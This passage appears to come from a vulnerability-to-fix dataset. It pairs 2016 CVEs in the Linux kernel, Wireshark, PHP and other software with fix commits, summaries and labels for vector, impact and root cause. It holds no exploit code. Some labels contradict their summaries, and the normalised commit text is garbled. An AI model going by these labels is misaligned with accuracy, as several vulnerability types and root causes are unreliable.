<torvalds@linux-foundation.org>","summary":"Memory leak in the airspy_probe function in drivers\/media\/usb\/airspy\/airspy.c in the airspy USB driver in the Linux kernel before 4.7 allows local users to cause a denial of service (memory consumption) via a crafted USB device that emulates many VFL_TYPE_SDR or VFL_TYPE_SUBDEV devices and performs many connect and disconnect operations.","commit_message_1":"fix airspy usb probe error path fix a memory leak on probe error of the airspy usb device driver","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted usb device that emulates many vfl _ type _ sdr or vfl _ type _ subdev devices and performs many connect and disconnect operations","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"b8e0d416898bb975a02c1b55883342edc5b4c9c0","cve_id":"CVE-2016-5359","cwe_id":"CWE-119","commit_message":"WBXML: add a basic sanity check for offset overflow\n\nThis is a naive approach allowing to detact that something went wrong,\nwithout the need to replace all proto_tree_add_text() calls as what was\ndone in master-2.0 branch.\n\nBug: 12408\nChange-Id: Ia14905005e17ae322c2fc639ad5e491fa08b0108\nReviewed-on: https:\/\/code.wireshark.org\/review\/15310\nReviewed-by: Michael Mann <mmann78@netscape.net>\nReviewed-by: Pascal Quantin <pascal.quantin@gmail.com>","summary":"epan\/dissectors\/packet-wbxml.c in the WBXML dissector in Wireshark 1.12.x before 1.12.12 mishandles offsets, which allows remote attackers to cause a denial of service (integer overflow and infinite loop) via a crafted packet.","commit_message_1":"add a basic sanity check for offset overflow this is a naive approach allowing to detact that something went wrong , without the need to replace all proto_tree_add_text ( ) call a what wa done in master-<file> branch","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( integer overflow and infinite loop )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"2c13e97d656c1c0ac4d76eb9d307664aae0e0cf7","cve_id":"CVE-2016-5358","cwe_id":"CWE-20","commit_message":"The WTAP_ENCAP_ETHERNET dissector needs to be passed a struct eth_phdr.\n\nWe now require that.  Make it so.\n\nBug: 12440\nChange-Id: Iffee520976b013800699bde3c6092a3e86be0d76\nReviewed-on: https:\/\/code.wireshark.org\/review\/15424\nReviewed-by: Guy Harris <guy@alum.mit.edu>","summary":"epan\/dissectors\/packet-pktap.c in the Ethernet dissector in Wireshark 2.x before 2.0.4 mishandles the packet-header data type, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.","commit_message_1":"the wtap_encap_ethernet dissector need to be passed a struct eth_phdr","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( application crash )","Root Cause":"mishandles the packet-header data type","Attack Type":"remote attacker"},{"commit_id":"6a140eca7b78b230f1f90a739a32257476513c78","cve_id":"CVE-2016-5357","cwe_id":"CWE-20","commit_message":"Fix packet length handling.\n\nTreat the packet length as unsigned - it shouldn't be negative in the\nfile.  If it is, that'll probably cause the sscanf to fail, so we'll\nreport the file as bad.\n\nCheck it against WTAP_MAX_PACKET_SIZE to make sure we don't try to\nallocate a huge amount of memory, just as we do in other file readers.\n\nUse the now-validated packet size as the length in\nws_buffer_assure_space(), so we are certain to have enough space, and\ndon't allocate too much space.\n\nMerge the header and packet data parsing routines while we're at it.\n\nBug: 12396\nChange-Id: I7f981f9cdcbea7ecdeb88bfff2f12d875de2244f\nReviewed-on: https:\/\/code.wireshark.org\/review\/15176\nReviewed-by: Guy Harris <guy@alum.mit.edu>","summary":"wiretap\/netscreen.c in the NetScreen file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","commit_message_1":"fix packet length handling","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash )","Root Cause":"mishandles sscanf unsigned-integer processing","Attack Type":"remote attacker"},{"commit_id":"a66628e425db725df1ac52a3c573a03357060ddd","cve_id":"CVE-2016-5356","cwe_id":"CWE-119","commit_message":"Don't treat the packet length as unsigned.\n\nThe scanf family of functions are as annoyingly bad at handling unsigned\nnumbers as strtoul() is - both of them are perfectly willing to accept a\nvalue beginning with a negative sign as an unsigned value.  When using\nstrtoul(), you can compensate for this by explicitly checking for a '-'\nas the first character of the string, but you can't do that with\nsscanf().\n\nSo revert to having pkt_len be signed, and scanning it with %d, but\ncheck for a negative value and fail if we see a negative value.\n\nBug: 12395\nChange-Id: I43b458a73b0934e9a5c2c89d34eac5a8f21a7455\nReviewed-on: https:\/\/code.wireshark.org\/review\/15223\nReviewed-by: Guy Harris <guy@alum.mit.edu>","summary":"wiretap\/cosine.c in the CoSine file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","commit_message_1":"do n't treat the packet length a unsigned","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"3270dfac43da861c714df76513456b46765ff47f","cve_id":"CVE-2016-5355","cwe_id":"CWE-20","commit_message":"Don't treat the packet length as unsigned.\n\nThe scanf family of functions are as annoyingly bad at handling unsigned\nnumbers as strtoul() is - both of them are perfectly willing to accept a\nvalue beginning with a negative sign as an unsigned value.  When using\nstrtoul(), you can compensate for this by explicitly checking for a '-'\nas the first character of the string, but you can't do that with\nsscanf().\n\nSo revert to having pkt_len be signed, and scanning it with %d, but\ncheck for a negative value and fail if we see a negative value.\n\nBug: 12394\nChange-Id: I4b19b95f2e1ffc96dac5c91bff6698c246f52007\nReviewed-on: https:\/\/code.wireshark.org\/review\/15230\nReviewed-by: Guy Harris <guy@alum.mit.edu>","summary":"wiretap\/toshiba.c in the Toshiba file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","commit_message_1":"do n't treat the packet length a unsigned","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash )","Root Cause":"mishandles sscanf unsigned-integer processing","Attack Type":"remote attacker"},{"commit_id":"2cb5985bf47bdc8bea78d28483ed224abdd33dc6","cve_id":"CVE-2016-5354","cwe_id":"CWE-476","commit_message":"Make class \"type\" for USB conversations.\n\nUSB dissectors can't assume that only their class type has been passed around in the conversation.  Make explicit check that class type expected matches the dissector and stop\/prevent dissection if there isn't a match.\n\nBug: 12356\nChange-Id: Ib23973a4ebd0fbb51952ffc118daf95e3389a209\nReviewed-on: https:\/\/code.wireshark.org\/review\/15212\nPetri-Dish: Michael Mann <mmann78@netscape.net>\nReviewed-by: Martin Kaiser <wireshark@kaiser.cx>\nPetri-Dish: Martin Kaiser <wireshark@kaiser.cx>\nTested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org>\nReviewed-by: Michael Mann <mmann78@netscape.net>","summary":"The USB subsystem in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles class types, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.","commit_message_1":"make class `` type '' for usb conversation","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"b6d838eebf4456192360654092e5587c5207f185","cve_id":"CVE-2016-5352","cwe_id":"CWE-125","commit_message":"Sanity check eapol_len in AirPDcapDecryptWPABroadcastKey\n\nBug: 12175\nChange-Id: Iaf977ba48f8668bf8095800a115ff9a3472dd893\nReviewed-on: https:\/\/code.wireshark.org\/review\/15326\nPetri-Dish: Michael Mann <mmann78@netscape.net>\nTested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org>\nReviewed-by: Alexis La Goutte <alexis.lagoutte@gmail.com>\nReviewed-by: Peter Wu <peter@lekensteyn.nl>\nTested-by: Peter Wu <peter@lekensteyn.nl>","summary":"epan\/crypt\/airpdcap.c in the IEEE 802.11 dissector in Wireshark 2.x before 2.0.4 mishandles certain length values, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.","commit_message_1":"sanity check eapol_len in airpdcapdecryptwpabroadcastkey","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"9b0b20b8d5f8c9f7839d58ff6c5900f7e19283b4","cve_id":"CVE-2016-5351","cwe_id":"CWE-20","commit_message":"Make sure EAPOL body is big enough for a EAPOL_RSN_KEY.\n\nA pointer to a EAPOL_RSN_KEY is set on the packet presuming the\nwhole EAPOL_RSN_KEY is there.  That's not always the case for\nfuzzed\/malicious captures.\n\nBug: 11585\nChange-Id: Ib94b8aceef444c7820e43b969596efdb8dbecccd\nReviewed-on: https:\/\/code.wireshark.org\/review\/15540\nReviewed-by: Michael Mann <mmann78@netscape.net>\nPetri-Dish: Michael Mann <mmann78@netscape.net>\nTested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org>\nReviewed-by: Anders Broman <a.broman58@gmail.com>","summary":"epan\/crypt\/airpdcap.c in the IEEE 802.11 dissector in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles the lack of an EAPOL_RSN_KEY, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.","commit_message_1":"make sure eapol body is big enough for a eapol_rsn_key","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( application crash )","Root Cause":"mishandles the lack of an EAPOL_RSN_KEY","Attack Type":"remote attacker"},{"commit_id":"b4d16b4495b732888e12baf5b8a7e9bf2665e22b","cve_id":"CVE-2016-5350","cwe_id":"CWE-399","commit_message":"SPOOLSS: Try to avoid an infinite loop.\n\nUse tvb_reported_length_remaining in dissect_spoolss_uint16uni. Make\nsure our offset always increments in dissect_spoolss_keybuffer.\n\nChange-Id: I7017c9685bb2fa27161d80a03b8fca4ef630e793\nReviewed-on: https:\/\/code.wireshark.org\/review\/14687\nReviewed-by: Gerald Combs <gerald@wireshark.org>\nPetri-Dish: Gerald Combs <gerald@wireshark.org>\nTested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org>\nReviewed-by: Michael Mann <mmann78@netscape.net>","summary":"epan\/dissectors\/packet-dcerpc-spoolss.c in the SPOOLS component in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles unexpected offsets, which allows remote attackers to cause a denial of service (infinite loop) via a crafted packet.","commit_message_1":"try to avoid an infinite loop","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( infinite loop )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"4116def2337991b39919f3b448326e21c40e0dbb","cve_id":"CVE-2016-5244","cwe_id":"CWE-200","commit_message":"rds: fix an infoleak in rds_inc_info_copy\n\nThe last field \"flags\" of object \"minfo\" is not initialized.\nCopying this object out may leak kernel stack data.\nAssign 0 to it to avoid leak.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nAcked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rds_inc_info_copy function in net\/rds\/recv.c in the Linux kernel through 4.6.3 does not initialize a certain structure member, which allows remote attackers to obtain sensitive information from kernel stack memory by reading an RDS message.","commit_message_1":"fix an infoleak in rds_inc_info_copy the last field `` flag '' of object `` minfo '' is not initialized","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading an rds message","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure member ","Attack Type":"remote attacker"},{"commit_id":"5d2be1422e02ccd697ccfcd45c85b4a26e6178e2","cve_id":"CVE-2016-5243","cwe_id":"CWE-200","commit_message":"tipc: fix an infoleak in tipc_nl_compat_link_dump\n\nlink_info.str is a char array of size 60. Memory after the NULL\nbyte is not initialized. Sending the whole object out can cause\na leak.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tipc_nl_compat_link_dump function in net\/tipc\/netlink_compat.c in the Linux kernel through 4.6.3 does not properly copy a certain string, which allows local users to obtain sensitive information from kernel stack memory by reading a Netlink message.","commit_message_1":"fix an infoleak in tipc_nl_compat_link_dump <file> is a char array of size <number>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading a netlink message","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly copy a certain string","Attack Type":"local attacker"},{"commit_id":"19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619","cve_id":"CVE-2016-5195","cwe_id":"CWE-362","commit_message":"mm: remove gup_flags FOLL_WRITE games from __get_user_pages()\n\nThis is an ancient bug that was actually attempted to be fixed once\n(badly) by me eleven years ago in commit 4ceb5db9757a (\"Fix\nget_user_pages() race for write access\") but that was then undone due to\nproblems on s390 by commit f33ea7f404e5 (\"fix get_user_pages bug\").\n\nIn the meantime, the s390 situation has long been fixed, and we can now\nfix it by checking the pte_dirty() bit properly (and do it better).  The\ns390 dirty bit was implemented in abf09bed3cce (\"s390\/mm: implement\nsoftware dirty bits\") which made it into v3.9.  Earlier kernels will\nhave to look at the page state itself.\n\nAlso, the VM has become more scalable, and what used a purely\ntheoretical race back then has become easier to trigger.\n\nTo fix it, we introduce a new internal FOLL_COW flag to mark the \"yes,\nwe already did a COW\" rather than play racy games with FOLL_WRITE that\nis very fundamental, and then use the pte dirty flag to validate that\nthe FOLL_COW flag is still valid.\n\nReported-and-tested-by: Phil \"not Paul\" Oester <kernel@linuxace.com>\nAcked-by: Hugh Dickins <hughd@google.com>\nReviewed-by: Michal Hocko <mhocko@suse.com>\nCc: Andy Lutomirski <luto@kernel.org>\nCc: Kees Cook <keescook@chromium.org>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: Willy Tarreau <w@1wt.eu>\nCc: Nick Piggin <npiggin@gmail.com>\nCc: Greg Thelen <gthelen@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Race condition in mm\/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka *Dirty COW.*","commit_message_1":"remove gup_flags foll_write game from __get_user_pages ( ) this is an ancient bug that wa actually attempted to be fixed once ( badly ) by me eleven year ago in commit 4ceb5db9757a ( `` fix get_user_pages ( ) race for write access '' ) but that wa then undone due to problem on s390 by commit f33ea7f404e5 ( `` fix get_user_pages bug '' )","Vulnerability Type":"Race Condition","Attack Vector":"by leveraging incorrect handling of a copy - on - write ( cow ) feature to write to a read - only memory mapping , as exploited in the wild in october 2016 , aka * dirty cow","Impact":"gain privileges","Root Cause":"caused by a race condition when handling the copy-on-write (COW) breakage of private read-only memory mappings by the memory subsystem","Attack Type":"local attacker"},{"commit_id":"e078172b1c3f98d2219c37076b238fb759c751ea","cve_id":"CVE-2016-5157","cwe_id":"CWE-119","commit_message":"Add sanity check for tile coordinates (#823)\n\nCoordinates are casted from OPJ_UINT32 to OPJ_INT32\nAdd sanity check for negative values and upper bound becoming lower\nthan lower bound.\nSee also\nhttps:\/\/pdfium.googlesource.com\/pdfium\/+\/b6befb2ed2485a3805cddea86dc7574510178ea9","summary":"Heap-based buffer overflow in the opj_dwt_interleave_v function in dwt.c in OpenJPEG, as used in PDFium in Google Chrome before 53.0.2785.89 on Windows and OS X and before 53.0.2785.92 on Linux, allows remote attackers to execute arbitrary code via crafted coordinate values in JPEG 2000 data.","commit_message_1":"add sanity check for tile coordinate ( # <number> ) coordinate are casted from opj_uint32 to opj_int32 add sanity check for negative value and upper bound becoming lower than lower bound","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by PDFium","Attack Type":"remote attacker"},{"commit_id":"4dc1a2d7931017d3625f2d7cff70a17ce58b53b4","cve_id":"CVE-2016-5116","cwe_id":"CWE-119","commit_message":"xbm: avoid stack overflow (read) with large names #211\n\nWe use the name passed in to printf into a local stack buffer which is\nlimited to 4000 bytes.  So given a large enough value, lots of stack\ndata is leaked.  Rewrite the code to do simple memory copies with most\nof the strings to avoid that issue, and only use stack buffer for small\nnumbers of constant size.\n\nThis closes #211.","summary":"gd_xbm.c in the GD Graphics Library (aka libgd) before 2.2.0, as used in certain custom PHP 5.5.x configurations, allows context-dependent attackers to obtain sensitive information from process memory or cause a denial of service (stack-based buffer under-read and application crash) via a long name.","commit_message_1":"avoid stack overflow ( read ) with large name # <number> we use the name passed in to printf into a local stack buffer which is limited to <number> byte","Vulnerability Type":"buffer overflow","Attack Vector":"via a long name","Impact":"obtain sensitive information from process memory or cause a denial of service ( stack - based buffer under - read and application crash )","Root Cause":"caused by a memory leak within the gdCtxPrintf","Attack Type":"remote attacker"},{"commit_id":"2721a0148649e07ed74468f097a28899741eb58f?w=1","cve_id":"CVE-2016-5114","cwe_id":"CWE-125","commit_message":"Fixed bug #70755: fpm_log.c memory leak and buffer overflow","summary":"sapi\/fpm\/fpm\/fpm_log.c in PHP before 5.5.31, 5.6.x before 5.6.17, and 7.x before 7.0.2 misinterprets the semantics of the snprintf return value, which allows attackers to obtain sensitive information from process memory or cause a denial of service (out-of-bounds read and buffer overflow) via a long string, as demonstrated by a long URI in a configuration with custom REQUEST_URI logging.","commit_message_1":"fixed bug # <number> : <file> memory leak and buffer overflow","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by a long URI","Impact":"obtain sensitive information","Root Cause":"caused by improper bounds checking","Attack Type":"remote attacker"},{"commit_id":"df1f5c4d70d0c19ad40072f5246ca457e7f9849e","cve_id":"CVE-2016-5104","cwe_id":"CWE-284","commit_message":"common: [security fix] Make sure sockets only listen locally","summary":"The socket_create function in common\/socket.c in libimobiledevice and libusbmuxd allows remote attackers to bypass intended access restrictions and communicate with services on iOS devices by connecting to an IPv4 TCP socket.","commit_message_1":"common : [ security fix ] make sure socket only listen locally","Vulnerability Type":"Improper Access Control","Attack Vector":"by connecting to an ipv4 tcp socket","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"abd159cce48f3e34f08e4751c568e09677d5ec9c?w=1","cve_id":"CVE-2016-5096","cwe_id":"CWE-190","commit_message":"Fix bug #72114 - int\/size_t confusion in fread","summary":"Integer overflow in the fread function in ext\/standard\/file.c in PHP before 5.5.36 and 5.6.x before 5.6.22 allows remote attackers to cause a denial of service or possibly have unspecified other impact via a large integer in the second argument.","commit_message_1":"fix bug # <number> - int\/size_t confusion in fread","Vulnerability Type":"integer overflow","Attack Vector":"via a large integer in the second argument","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer underflow","Attack Type":"remote attacker"},{"commit_id":"0da8b8b801f9276359262f1ef8274c7812d3dfda?w=1","cve_id":"CVE-2016-5094","cwe_id":"CWE-190","commit_message":"Fix bug #72135 - don't create strings with lengths outside int range","summary":"Integer overflow in the php_html_entities function in ext\/standard\/html.c in PHP before 5.5.36 and 5.6.x before 5.6.22 allows remote attackers to cause a denial of service or possibly have unspecified other impact by triggering a large output string from the htmlspecialchars function.","commit_message_1":"fix bug # <number> - do n't create string with length outside int range","Vulnerability Type":"integer overflow","Attack Vector":"by triggering a large output string","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"97eff7eb57fc2320c267a949cffd622c38712484?w=1","cve_id":"CVE-2016-5093","cwe_id":"CWE-125","commit_message":"Fix bug #72241: get_icu_value_internal out-of-bounds read","summary":"The get_icu_value_internal function in ext\/intl\/locale\/locale_methods.c in PHP before 5.5.36, 5.6.x before 5.6.22, and 7.x before 7.0.7 does not ensure the presence of a '0' character, which allows remote attackers to cause a denial of service (out-of-bounds read) or possibly have unspecified other impact via a crafted locale_get_primary_language call.","commit_message_1":"fix bug # <number> : get_icu_value_internal out-of-bounds read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted locale_get_primary_language call","Impact":"cause a denial of service (out-of-bounds read) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"957ece7e95d8f8746191fd9629622d4457d690d6","cve_id":"CVE-2016-5009","cwe_id":"CWE-20","commit_message":"Merge pull request #9700 from JiYou\/fix-monitor-crush\n\nmon: Monitor: validate prefix on handle_command()\n\nReviewed-by: Sage Weil <sage@redhat.com>\nReviewed-by: Joao Eduardo Luis <joao@suse.de>","summary":"The handle_command function in mon\/Monitor.cc in Ceph allows remote authenticated users to cause a denial of service (segmentation fault and ceph monitor crash) via an (1) empty or (2) crafted prefix.","commit_message_1":"merge pull request # <number> from jiyou\/fix-monitor-crush","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an empty or crafted prefix","Impact":"cause a denial of service ( segmentation fault and ceph monitor crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91","cve_id":"CVE-2016-4998","cwe_id":"CWE-119","commit_message":"netfilter: x_tables: make sure e->next_offset covers remaining blob size\n\nOtherwise this function may read data beyond the ruleset blob.\n\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The IPT_SO_SET_REPLACE setsockopt implementation in the netfilter subsystem in the Linux kernel before 4.6 allows local users to cause a denial of service (out-of-bounds read) or possibly obtain sensitive information from kernel heap memory by leveraging in-container root access to provide a crafted offset value that leads to crossing a ruleset blob boundary.","commit_message_1":"x_tables : make sure e- > next_offset cover remaining blob size otherwise this function may read data beyond the ruleset blob","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging in - container root access to provide a crafted offset value that leads to crossing a ruleset blob boundary","Impact":"cause a denial of service ( out - of - bounds read ) or possibly obtain sensitive information from kernel heap memory","Root Cause":"caused by a out-of-bounds memory access error","Attack Type":"local attacker"},{"commit_id":"ce683e5f9d045e5d67d1312a42b359cb2ab2a13c","cve_id":"CVE-2016-4997","cwe_id":"CWE-264","commit_message":"netfilter: x_tables: check for bogus target offset\n\nWe're currently asserting that targetoff + targetsize <= nextoff.\n\nExtend it to also check that targetoff is >= sizeof(xt_entry).\nSince this is generic code, add an argument pointing to the start of the\nmatch\/target, we can then derive the base structure size from the delta.\n\nWe also need the e->elems pointer in a followup change to validate matches.\n\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The compat IPT_SO_SET_REPLACE and IP6T_SO_SET_REPLACE setsockopt implementations in the netfilter subsystem in the Linux kernel before 4.6.3 allow local users to gain privileges or cause a denial of service (memory corruption) by leveraging in-container root access to provide a crafted offset value that triggers an unintended decrement.","commit_message_1":"x_tables : check for bogus target offset we 're currently asserting that targetoff + targetsize < = nextoff","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging in - container root access to provide a crafted offset value that triggers an unintended decrement","Impact":"gain privileges or cause a denial of service ( memory corruption )","Root Cause":"caused by a memory corruption error","Attack Type":"local attacker"},{"commit_id":"2d0e4eff04ea963128a41faaef21f987272e05a2","cve_id":"CVE-2016-4979","cwe_id":"CWE-284","commit_message":"modssl: reset client-verify state when renegotiation is aborted\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/trunk@1750779 13f79535-47bb-0310-9956-ffa450edef68","summary":"The Apache HTTP Server 2.4.18 through 2.4.20, when mod_http2 and mod_ssl are enabled, does not properly recognize the *SSLVerifyClient require* directive for HTTP\/2 request authorization, which allows remote attackers to bypass intended access restrictions by leveraging the ability to send multiple requests over a single connection and aborting a renegotiation.","commit_message_1":"modssl : reset client-verify state when renegotiation is aborted","Vulnerability Type":"Improper Access Control","Attack Vector":"by leveraging the ability to send multiple requests over a single connection and aborting a renegotiation","Impact":"bypass security restrictions","Root Cause":"does not properly recognize the * sslverifyclient require * directive for http \/ 2 request authorization ,","Attack Type":"remote attacker"},{"commit_id":"45e093ae2830cd1264677d47ff9a95a71f5d9f9c","cve_id":"CVE-2016-4951","cwe_id":null,"commit_message":"tipc: check nl sock before parsing nested attributes\n\nMake sure the socket for which the user is listing publication exists\nbefore parsing the socket netlink attributes.\n\nPrior to this patch a call without any socket caused a NULL pointer\ndereference in tipc_nl_publ_dump().\n\nTested-and-reported-by: Baozeng Ding <sploving1@gmail.com>\nSigned-off-by: Richard Alpe <richard.alpe@ericsson.com>\nAcked-by: Jon Maloy <jon.maloy@ericsson.cm>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tipc_nl_publ_dump function in net\/tipc\/socket.c in the Linux kernel through 4.6 does not verify socket existence, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a dumpit operation.","commit_message_1":"check nl sock before parsing nested attribute make sure the socket for which the user is listing publication exists before parsing the socket netlink attribute","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a dumpit operation","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"does not verify socket existence","Attack Type":"local attacker"},{"commit_id":"99d825822eade8d827a1817357cbf3f889a552d6","cve_id":"CVE-2016-4913","cwe_id":"CWE-200","commit_message":"get_rock_ridge_filename(): handle malformed NM entries\n\nPayloads of NM entries are not supposed to contain NUL.  When we run\ninto such, only the part prior to the first NUL goes into the\nconcatenation (i.e. the directory entry name being encoded by a bunch\nof NM entries).  We do stop when the amount collected so far + the\nclaimed amount in the current NM entry exceed 254.  So far, so good,\nbut what we return as the total length is the sum of *claimed*\nsizes, not the actual amount collected.  And that can grow pretty\nlarge - not unlimited, since you'd need to put CE entries in\nbetween to be able to get more than the maximum that could be\ncontained in one isofs directory entry \/ continuation chunk and\nwe are stop once we'd encountered 32 CEs, but you can get about 8Kb\neasily.  And that's what will be passed to readdir callback as the\nname length.  8Kb __copy_to_user() from a buffer allocated by\n__get_free_page()\n\nCc: stable@vger.kernel.org # 0.98pl6+ (yes, really)\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The get_rock_ridge_filename function in fs\/isofs\/rock.c in the Linux kernel before 4.5.5 mishandles NM (aka alternate name) entries containing 0 characters, which allows local users to obtain sensitive information from kernel memory or possibly have unspecified other impact via a crafted isofs filesystem.","commit_message_1":"handle malformed nm entry payload of nm entry are not supposed to contain nul","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted isofs filesystem","Impact":"obtain sensitive information from kernel memory or possibly have unspecified other impact","Root Cause":"caused by the improper handling of NM entries containing NUL characters by the get_rock_ridge_filename function","Attack Type":"local attacker"},{"commit_id":"1c0808d580da09fdec5a9a74ff09e103ea058dd4","cve_id":"CVE-2016-4817","cwe_id":null,"commit_message":"h2: use after free on premature connection close #920\n\nlib\/http2\/connection.c:on_read() calls parse_input(), which might free\n`conn`. It does so in particular if the connection preface isn't\nthe expected one in expect_preface(). `conn` is then used after the free\nin `if (h2o_timeout_is_linked(&conn->_write.timeout_entry)`.\nWe fix this by adding a return value to close_connection that returns a\nnegative value if `conn` has been free'd and can't be used anymore.\n\nCredits for finding the bug to Tim Newsham.","summary":"lib\/http2\/connection.c in H2O before 1.7.3 and 2.x before 2.0.0-beta5 mishandles HTTP\/2 disconnection, which allows remote attackers to cause a denial of service (use-after-free and application crash) or possibly execute arbitrary code via a crafted packet.","commit_message_1":"use after free on premature connection close # <number> lib\/http2\/<file> : on_read ( ) call parse_input ( ) , which might free ` conn `","Vulnerability Type":"use-after-free","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( use - after - free and application crash ) or possibly execute arbitrary code","Root Cause":"mishandles http \/ 2 disconnection","Attack Type":"remote attacker"},{"commit_id":"fd7e0c02","cve_id":"CVE-2016-4809","cwe_id":"CWE-20","commit_message":"Reject cpio symlinks that exceed 1MB","summary":"The archive_read_format_cpio_read_header function in archive_read_support_format_cpio.c in libarchive before 3.2.1 allows remote attackers to cause a denial of service (application crash) via a CPIO archive with a large symlink.","commit_message_1":"reject cpio symlinks that exceed 1mb","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a cpio archive with a large symlink","Impact":"cause a denial of service ( application crash )","Root Cause":"archive_read_format_cpio_read_header function","Attack Type":"remote attacker"},{"commit_id":"1f461dcdd296eecedaffffc6bae2bfa90bd7eb89","cve_id":"CVE-2016-4805","cwe_id":"CWE-416","commit_message":"ppp: take reference on channels netns\n\nLet channels hold a reference on their network namespace.\nSome channel types, like ppp_async and ppp_synctty, can have their\nuserspace controller running in a different namespace. Therefore they\ncan't rely on them to preclude their netns from being removed from\nunder them.\n\n==================================================================\nBUG: KASAN: use-after-free in ppp_unregister_channel+0x372\/0x3a0 at\naddr ffff880064e217e0\nRead of size 8 by task syz-executor\/11581\n=============================================================================\nBUG net_namespace (Not tainted): kasan: bad access detected\n-----------------------------------------------------------------------------\n\nDisabling lock debugging due to kernel taint\nINFO: Allocated in copy_net_ns+0x6b\/0x1a0 age=92569 cpu=3 pid=6906\n[<      none      >] ___slab_alloc+0x4c7\/0x500 kernel\/mm\/slub.c:2440\n[<      none      >] __slab_alloc+0x4c\/0x90 kernel\/mm\/slub.c:2469\n[<     inline     >] slab_alloc_node kernel\/mm\/slub.c:2532\n[<     inline     >] slab_alloc kernel\/mm\/slub.c:2574\n[<      none      >] kmem_cache_alloc+0x23a\/0x2b0 kernel\/mm\/slub.c:2579\n[<     inline     >] kmem_cache_zalloc kernel\/include\/linux\/slab.h:597\n[<     inline    